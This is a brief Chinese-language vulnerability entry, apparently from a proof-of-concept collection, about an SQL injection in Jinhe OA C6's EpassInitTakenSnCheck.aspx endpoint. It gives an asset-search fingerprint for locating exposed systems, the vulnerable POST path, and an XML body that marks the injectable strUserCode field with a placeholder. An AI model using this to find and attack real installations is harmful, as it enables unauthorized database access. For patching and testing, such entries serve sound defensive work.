# 金和OAC6EpassInitTakenSnCheck存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/Jhsoft.Web.epass/EpassInitTakenSnCheck.aspx/ HTTP/1.1`

**Payload**
```
<root>
<strUserCode>SQLI_POC</strUserCode>
<strTokenSn>1</strTokenSn>
</root>
```
- **响应特征**：200